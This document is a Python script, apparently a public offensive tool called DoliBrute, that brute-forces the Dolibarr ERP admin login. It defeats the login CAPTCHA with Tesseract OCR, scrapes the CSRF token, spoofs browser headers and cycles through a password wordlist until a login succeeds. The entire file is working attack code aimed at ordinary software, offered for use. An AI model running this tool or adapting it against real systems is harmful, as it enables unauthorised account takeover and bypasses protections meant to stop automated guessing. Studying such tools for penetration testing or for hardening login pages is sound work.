#!/usr/bin/env python3

# DoliBrute is a login brute force tool with captcha bypass for Dolibarr login page.  
# Version : v0.1
# Author : BaadMaro
# Github : https://github.com/BaadMaro

import requests
from bs4 import BeautifulSoup
import lxml
import urllib
from io import BytesIO
from urllib.parse import quote_plus as qp
import pytesseract
from PIL import Image
from requests.structures import CaseInsensitiveDict
import sys
import optparse

#Linux
pytesseract.pytesseract.tesseract_cmd = "/usr/bin/tesseract"

#Windows
#pytesseract.pytesseract.tesseract_cmd = 'C:/Program Files/Tesseract-OCR/tesseract.exe'

session = requests.Session()
headers = CaseInsensitiveDict()

def get_captcha_code(base_url):
    code = ""
    while len(code) != 5:
        r = session.get(f"{base_url}core/antispamimage.php", verify=False)
        img = Image.open(BytesIO(r.content))
        #img.show()
        code = pytesseract.image_to_string(img).split("\n")[0]
        for char in code:
            if char not in "aAbBCDeEFgGhHJKLmMnNpPqQRsStTuVwWXYZz2345679":
                code = ""
                break
    return code


def auth (base_url, username, passwords):
    login_url = base_url + "/admin/index.php?mainmenu=home"
    for password in passwords:
        a = 1
        while(a==1):
            request = session.get(login_url)

            captcha = get_captcha_code(base_url)

            # Get the token value
            page_source = BeautifulSoup(request.text,"lxml")
            token = page_source.find("input",{'name':'token'})['value']
            
            cookies = session.cookies

            headers["Connection"] = "keep-alive"
            headers["Cache-Control"] = "max-age=0"
            headers["Upgrade-Insecure-Requests"] = "1"
            headers["Origin"] = base_url
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36"
            headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
            headers["Referer"] = f"{base_url}admin/index.php?mainmenu=home"
            headers["Accept-Language"] = "en-US,en;q=0.9,ar;q=0.8,fr;q=0.7"

            # you can use json object or f string format
            data = "token=" + str(urllib.parse.quote(token,safe='')) + "&actionlogin=login&loginfunction=loginfunction&tz=1&tz_string=Africa%2FCasablanca&dst_observed=0&dst_first=2022-05-8T01%3A59%3A00Z&dst_second=2022-03-27T02%3A59%3A00Z&screenwidth=1038&screenheight=718&dol_hide_topmenu=&dol_hide_leftmenu=&dol_optimize_smallscreen=&dol_no_mouse_hover=&dol_use_jmobile=&username=" + str(username) + "&password=" + str(password[:-1]) + "&code=" + str(captcha)

            resp = session.post(login_url, headers=headers, data=data, cookies=cookies, allow_redirects=False) # stop redirect to catch 302 (didn't work

            login = BeautifulSoup(resp.text,"lxml")

            error_message = login.find("div",{'class':'error'})

            
            if error_message != None :
                if(error_message.text.strip() == "Bad value for login or password"):
                    print(f"[!] [{resp.status_code}] Wrong login {username}:{password[:-1]}")
                    a = 0
                else:
                    if (error_message.text.strip() == "Bad value for security code. Try again with new value..."):
                        print(f"[!] [{resp.status_code}] Wrong captcha ocr. Retrying...")
                        
            # simple test case. It's better to do it with 302 status code.        
            else:
                print(f"[*] Done! {username}:{password[:-1]} ")
                sys.exit()

def main():
    banner = r'''
    
 
 _____        _ _ ____             _       
|  __ \      | (_)  _ \           | |      
| |  | | ___ | |_| |_) |_ __ _   _| |_ ___ 
| |  | |/ _ \| | |  _ <| '__| | | | __/ _ \
| |__| | (_) | | | |_) | |  | |_| | ||  __/
|_____/ \___/|_|_|____/|_|   \__,_|\__\___|
  
  DoliBrute is a login brute force tool with captcha bypass for Dolibarr login page.                                        
  V0.1
  Coded by BaadMaro
    '''
    print(banner)
    parser = optparse.OptionParser("""
    python3 DoliBrute.py -u http://127.0.0.1/ -U admin -P default-passwords.txt
""")
    parser.add_option('-U', dest='username', type='string',\
      help='specify username ')
    parser.add_option('-P', dest='passwords', type='string',\
      help='specify passwords list')
    parser.add_option('-u', dest='base_url', type='string',\
      help='specify base url with "/" at the end')

    (options, args) = parser.parse_args()

    username = options.username
    passwords = options.passwords
    base_url = options.base_url

    if (username == None) | (passwords == None) | (base_url == None) :
      print(parser.usage)
      exit(0)
    
    passwords = open(passwords, "r")     
    auth(base_url, username, passwords)


if __name__ == '__main__':
    main()
